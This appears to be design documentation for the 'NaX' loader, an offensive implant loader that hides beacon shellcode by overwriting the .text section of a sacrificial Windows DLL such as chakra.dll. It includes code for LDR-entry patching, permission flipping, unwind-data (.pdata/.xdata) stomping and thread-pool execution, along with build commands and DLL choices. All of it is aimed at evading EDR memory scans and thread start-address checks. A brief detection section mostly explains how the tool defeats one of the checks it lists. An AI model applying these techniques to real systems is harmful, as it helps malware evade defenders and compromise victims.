# Module Stomping

The NaX loader supports **module stomping** as its primary memory allocation strategy. Instead of placing beacon shellcode in private memory (PRV) allocated by `NtAllocateVirtualMemory`, module stomping loads a sacrificial Windows DLL and overwrites its `.text` section with the beacon. The result is beacon code running from image-backed (IMG) memory with `PAGE_EXECUTE_READ` protection - indistinguishable from a legitimately loaded DLL in memory scans.

## Why Module Stomping

EDR products flag a well-known pattern: large blocks of private memory with executable permissions. Any `NtAllocateVirtualMemory` call that produces a committed, executable, unbacked region is a strong indicator of injected code - reflective loaders, shellcode runners, and in-memory implants all leave this signature.

Module stomping sidesteps the heuristic entirely:

| Property | VirtualAlloc (PRV) | Module Stomp (IMG) |
|----------|--------------------|--------------------|
| Memory type | Private | Image (mapped file) |
| Backing | None (pagefile) | On-disk DLL |
| Permissions after setup | PAGE_EXECUTE_READ | PAGE_EXECUTE_READ |
| MEM_IMAGE flag | No | Yes |
| Appears in loaded module list | No | Yes (patched LDR entry) |
| Stack walk | Start address = beacon | Start address = ntdll!TppWorkerThread |

The `MODULE_STOMP=1` build (default) produces payloads that use image-backed memory. `MODULE_STOMP=0` falls back to `NtAllocateVirtualMemory` for testing or environments where module stomping is impractical.

## Compile-Time Configuration

Technique selection is entirely compile-time, controlled by preprocessor defines passed through the Makefile. There are no runtime branches between stomp and virtual modes - the unused path is not compiled into the binary.

### Makefile Variables

| Variable | Values | Default | Effect |
|----------|--------|---------|--------|
| `MODULE_STOMP` | `0` / `1` | `0` | Sets `--module-stomp` flag in packed header |
| `STOMP_DLL` | Any DLL name | `chakra.dll` | Sacrificial DLL embedded in NaxHeader |
| `STOMP_PDATA` | `0` / `1` | Same as `MODULE_STOMP` | Enables `.pdata`/`.xdata` unwind stomping |
| `NAX_STOMP_MODE` | `0` (VIRTUAL) / `1` (MODULE) | `1` | Compile-time stomp strategy for loader |
| `NAX_EXEC_MODE` | `0` (THREAD) / `1` (THREADPOOL) | `1` | Compile-time execution transfer method |

### Build Examples

```bash
# Default: module stomp with chakra.dll, thread pool execution
make MODULE_STOMP=1

# Custom sacrificial DLL
make MODULE_STOMP=1 STOMP_DLL=mshtml.dll

# Module stomp with .pdata unwind stomping
make MODULE_STOMP=1 STOMP_PDATA=1

# Fallback: private memory allocation (for testing)
make MODULE_STOMP=0 NAX_STOMP_MODE=0
```

### Preprocessor Defines (src_loader/include/Defs.h)

```c
#define NAX_STOMP_VIRTUAL    0   // NtAllocateVirtualMemory path
#define NAX_STOMP_MODULE     1   // Module stomp path

#define NAX_EXEC_THREAD      0   // CreateThread
#define NAX_EXEC_THREADPOOL  1   // TpAllocWork / TpPostWork
```

The loader compiles only the selected path. When `NAX_STOMP_MODE == NAX_STOMP_MODULE`, the virtual allocation functions are excluded entirely, and vice versa. Same for execution mode.

## Packed Binary Layout (NaxHeader v2)

The `pack_nax.py` script assembles the final payload with a 160-byte header between the loader shellcode and the beacon:

```
+------------------+
|  Loader (.text)  |   Position-independent loader shellcode
+------------------+
|  NaxHeader v2    |   160 bytes - metadata for the loader
+------------------+
|  Beacon (.text)  |   PIC beacon shellcode
+------------------+
|  .pdata blob     |   RUNTIME_FUNCTION entries (if STOMP_PDATA)
+------------------+
|  .xdata blob     |   UNWIND_INFO records (if STOMP_PDATA)
+------------------+
```

### NaxHeader v2 Structure

The header is accessed via pointer arithmetic (no struct, since the loader is PIC shellcode with no relocations):

```
Offset  Size    Field           Description
------  ------  -----------     ------------------------------------------
0       4       Magic           0x4E415832 ("NAX2")
4       4       BeaconSize      Beacon blob size in bytes
8       4       PdataSize       .pdata blob size (0 if disabled)
12      4       XdataSize       .xdata blob size (0 if disabled)
16      4       OrigTextRva     Beacon's .text section RVA from ELF link
20      4       Flags           Bit 0: MODULE_STOMP, Bit 1: STOMP_PDATA
24      128     StompDll        WCHAR[64], NUL-terminated DLL name
152     8       Reserved        Zero-padded
------  ------  -----------     ------------------------------------------
Total:  160 bytes
```

The loader finds the header at `LOADER_END()` - the first byte past its own shellcode - then indexes into it with `HDR_U32(ptr, offset)` and `HDR_WSTR(ptr, offset)` macros.

## Module Stomp Flow

Implementation lives in `src_loader/src/Stomp.c` (`NaxModuleStomp`) with PE helpers in `Pe.c` and LDR patching inline.

### Step-by-Step

```
                                    Loader Main()
                                         |
                    +--------------------+--------------------+
                    |                                         |
           NAX_STOMP_MODULE                          NAX_STOMP_VIRTUAL
                    |                                         |
        LoadLibraryExW(DLL,                       NtAllocateVirtualMemory
          DONT_RESOLVE_DLL_REFERENCES)               PAGE_READWRITE
                    |                                         |
            NaxPatchLdr()                            MmCopy beacon
           (fix LDR entry)                                   |
                    |                              VirtualProtect
         NaxFindSection(.text)                      PAGE_EXECUTE_READ
          validate size >= beacon                             |
                    |                                    NaxExec*()
      VirtualProtect(.text, PAGE_READWRITE)
                    |
           MmCopy beacon -> .text
                    |
      VirtualProtect(.text, PAGE_EXECUTE_READ)
                    |
          [optional: stomp .pdata/.xdata]
                    |
               NaxExec*()
```

### 1. Load Sacrificial DLL

```c
DllBase = LoadLibraryExW( DllName, NULL, DONT_RESOLVE_DLL_REFERENCES );
```

The `DONT_RESOLVE_DLL_REFERENCES` flag is critical: it maps the DLL into the process address space as an image (creates image-backed VAD entries) but **does not** call `DllMain`, resolve imports, or execute TLS callbacks. The DLL is loaded but inert.

### 2. Patch LDR Entry

`NaxPatchLdr()` walks the PEB loader data table (`PEB->Ldr->InLoadOrderModuleList`) to find the entry matching `DllBase`, then:

- Sets `EntryPoint` to the address calculated from `OptionalHeader.AddressOfEntryPoint`
- Adds flags `LDRP_IMAGE_DLL | LDRP_ENTRY_PROCESSED`

This makes the DLL appear as though it was loaded normally via `LoadLibrary` with all initialization complete. Without this patch, the DLL's LDR entry would lack the `ENTRY_PROCESSED` flag, which some tools use to detect hollow/stomped modules.

### 3. Find and Validate .text Section

```c
TextSec = NaxFindSection( Nt, IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE );
if ( !TextSec || TextSec->SizeOfRawData < BeaconSize )
    return NULL;
```

`NaxFindSection()` iterates the PE section table looking for the first section whose characteristics include both `IMAGE_SCN_CNT_CODE` and `IMAGE_SCN_MEM_EXECUTE`. If the `.text` section is smaller than the beacon, the stomp aborts and returns NULL - the loader does not attempt partial writes or section splitting.

### 4. Stomp Beacon into .text

```c
VirtualProtect( TextBase, SizeOfRawData, PAGE_READWRITE, &OldProt );
MmCopy( TextBase, BeaconSrc, BeaconSize );
VirtualProtect( TextBase, SizeOfRawData, PAGE_EXECUTE_READ, &OldProt );
```

The permission sequence is:

1. `PAGE_EXECUTE_READ` (original DLL .text) -> `PAGE_READWRITE` (to write beacon)
2. Copy beacon bytes over the DLL's code
3. `PAGE_READWRITE` -> `PAGE_EXECUTE_READ` (final state)

**No RWX at any point.** The memory is never simultaneously writable and executable. After setup, the beacon runs from `PAGE_EXECUTE_READ` image-backed memory - the same protection and backing type as any legitimate loaded DLL.

### 5. Stomp Unwind Data (.pdata / .xdata)

If the packed binary includes `.pdata` and `.xdata` blobs (controlled by `STOMP_PDATA`), the loader replaces the sacrificial DLL's exception handling metadata with entries that describe the beacon's functions.

```c
// Find the DLL's .pdata section via the exception directory
PdataSec = NaxFindSectionByDir( Nt, IMAGE_DIRECTORY_ENTRY_EXCEPTION );

// Validate capacity: must hold both pdata entries AND xdata records
if ( PdataSec->SizeOfRawData >= ( PdataSize + XdataSize ) ) {
    // Copy pdata entries first, xdata immediately after
    MmCopy( PdataBase, PdataSrc, PdataSize );
    MmCopy( PdataBase + PdataSize, XdataSrc, XdataSize );
```

#### RVA Adjustment

The `.pdata` entries (RUNTIME_FUNCTION structs) are stored in the packed binary with **0-based offsets** - the build-time `pack_nax.py` script normalizes them by subtracting the beacon's original `.text` and `.xdata` RVAs. The loader adds the DLL's actual RVAs at runtime:

```c
for ( ULONG i = 0; i < EntryCount; i++ ) {
    Entries[i].BeginAddress += DllTextRva;    // DLL's .text section VA
    Entries[i].EndAddress   += DllTextRva;
    Entries[i].UnwindData   += XdataRva;      // PdataRva + PdataSize
}
```

Where:
- `DllTextRva` = the sacrificial DLL's `.text` section `VirtualAddress`
- `XdataRva` = `PdataRva + PdataSize` (xdata is placed immediately after pdata)

Finally, the loader patches the PE optional header's exception data directory to point to the new `.pdata`:

```c
Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress = PdataRva;
Nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size = PdataSize;
```

This requires a temporary `PAGE_READWRITE` on the PE header page, restored immediately after.

#### Build-Time .pdata Preparation

The `pack_nax.py` packer performs several transformations on the unwind data before embedding it:

1. **Normalize RVAs** - Subtract the beacon's `.text` RVA from `BeginAddress`/`EndAddress` and the `.xdata` RVA from `UnwindData`, producing 0-based offsets
2. **Prepend Entry.asm unwind info** - Builds a RUNTIME_FUNCTION + UNWIND_INFO for the loader's `Entry.asm` stub (the actual entry point that calls `NaxMain`), placing its UNWIND_INFO at the start of `.xdata`
3. **Shift existing UnwindData offsets** - All existing `.pdata` entries get their `UnwindData` offset increased by the size of the prepended UNWIND_INFO

The result is that after the loader applies DLL-relative RVA adjustments, Windows sees valid unwind metadata for every function in the beacon, including the entry stub.

### 6. Execution Transfer

After stomping, the loader transfers execution to the beacon entry point (the start of the DLL's `.text` section where the beacon was written).

#### Thread Pool Mode (default)

```c
TpAllocWork( &Work, (PTP_WORK_CALLBACK)Entry, NULL, NULL );
TpPostWork( Work );
TpReleaseWork( Work );
```

The beacon runs as a Windows thread pool work item. The resulting thread has `ntdll!TppWorkerThread` as its start address - this is a legitimate Windows thread pool worker, making the beacon thread blend in with normal application threads. EDR products examining thread start addresses see a known ntdll function, not a suspicious address inside a DLL's `.text` section.

#### CreateThread Mode (fallback)

```c
CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)Entry, NULL, 0, NULL );
```

A direct `CreateThread` call. The stack is clean (`RtlUserThreadStart` -> `BaseThreadInitThunk` -> beacon), but the thread start address points directly at the beacon entry - visible to thread enumeration tools.

Both modes include a fallback: if the API call fails, the beacon is invoked as a direct function call on the current thread.

## Sacrificial DLL Selection

The stomped DLL must satisfy several constraints:

| Requirement | Reason |
|-------------|--------|
| `.text` section >= beacon size | The beacon is written into `.text`; no fallback if too small |
| `.pdata` section >= pdata + xdata size | Unwind data must fit (if `STOMP_PDATA` enabled) |
| Signed Windows DLL | Must appear legitimate; unsigned or third-party DLLs draw scrutiny |
| Not commonly loaded | Avoids conflicts if the target process already loaded the DLL normally |
| No critical side effects on load | Even with `DONT_RESOLVE_DLL_REFERENCES`, the DLL is mapped |

### Recommended DLLs

| DLL | .text Size (approx) | Notes |
|-----|---------------------|-------|
| `chakra.dll` | ~3 MB | Default. Legacy Edge JavaScript engine, rarely loaded in most processes |
| `mshtml.dll` | ~7 MB | Trident HTML engine, very large .text, good for big beacons |
| `jscript9.dll` | ~2 MB | IE JavaScript engine |
| `d3d11.dll` | ~1 MB | DirectX 11, less common in non-GUI processes |

The DLL name is embedded in the NaxHeader and read by the loader at runtime. Changing the DLL requires only a rebuild with `STOMP_DLL=<name>`:

```bash
make MODULE_STOMP=1 STOMP_DLL=mshtml.dll
```

## Memory Layout After Stomping

After `NaxModuleStomp` completes, the in-memory state is:

```
Process Memory Map
==================

chakra.dll (image-backed, MEM_IMAGE)
+-------------------------------------------+
| PE Headers          PAGE_READONLY         |  Patched: exception directory
+-------------------------------------------+  points to new .pdata
| .text               PAGE_EXECUTE_READ     |  <-- beacon shellcode lives here
|   [beacon code]                           |
|   [unused remainder = original DLL code]  |
+-------------------------------------------+
| .rdata              PAGE_READONLY         |  Original DLL read-only data
+-------------------------------------------+
| .data               PAGE_READWRITE        |  Original DLL data
+-------------------------------------------+
| .pdata              PAGE_READONLY         |  Stomped: beacon RUNTIME_FUNCTION
|   [RUNTIME_FUNCTION entries]              |  entries + UNWIND_INFO records
|   [UNWIND_INFO records (.xdata)]          |
+-------------------------------------------+
| .rsrc               PAGE_READONLY         |  Original DLL resources
+-------------------------------------------+

PEB Loader Data
===============
InLoadOrderModuleList:
  ...
  -> chakra.dll
       DllBase    = 0x00007FFA12340000
       EntryPoint = DllBase + AddressOfEntryPoint
       Flags      = LDRP_IMAGE_DLL | LDRP_ENTRY_PROCESSED | ...
  ...

Thread Pool
===========
Worker thread:
  StartAddress = ntdll!TppWorkerThread
  Callback     = 0x00007FFA12341000  (chakra.dll .text + 0x1000)
```

## Source Files

| File | Purpose |
|------|---------|
| `src_loader/src/Stomp.c` | `NaxModuleStomp()`, `NaxPatchLdr()` - core stomping logic |
| `src_loader/src/Pe.c` | `NaxPeHeaders()`, `NaxFindSection()`, `NaxFindSectionByDir()` - PE parsing |
| `src_loader/src/Exec.c` | `NaxExecThreadPool()`, `NaxExecThread()` - execution transfer |
| `src_loader/src/Main.c` | `Main()` - header parsing, API resolution, dispatch to stomp or alloc |
| `src_loader/src/PreMain.c` | `PreMain()` - Stardust bootstrap (TLS, heap, instance) |
| `src_loader/include/Defs.h` | NaxHeader v2 layout, technique defines, flag constants |
| `src_loader/include/Loader.h` | Function prototypes (conditionally compiled per mode) |
| `scripts/pack_nax.py` | Build-time packer: assembles loader + header + beacon + unwind data |
| `Makefile` | Top-level build: technique selection, DLL name, pack flags |

## Detection Considerations

Module stomping is not invisible. Defenders can look for:

- **Modified DLL .text hash** - The on-disk `.text` section content will not match the in-memory content. Tools that compare mapped DLL sections against their on-disk counterparts (e.g., `pe-sieve`, Moneta) can detect the discrepancy.
- **Unusual DLL loads** - Loading `chakra.dll` or `mshtml.dll` in a process that has no reason to use those libraries is anomalous. DLL selection should match the target process context.
- **Load without initialization** - `DONT_RESOLVE_DLL_REFERENCES` leaves the DLL's import table unresolved. Deep inspection of the IAT shows NULL entries where resolved function pointers should be.
- **.pdata mismatch** - If unwind stomping is disabled, the `.pdata` section still describes the original DLL's functions while `.text` contains entirely different code.

The .pdata stomping feature (`STOMP_PDATA=1`) specifically addresses the last point by replacing the exception metadata with valid entries for the beacon, enabling clean stack walks that match the actual code in `.text`.
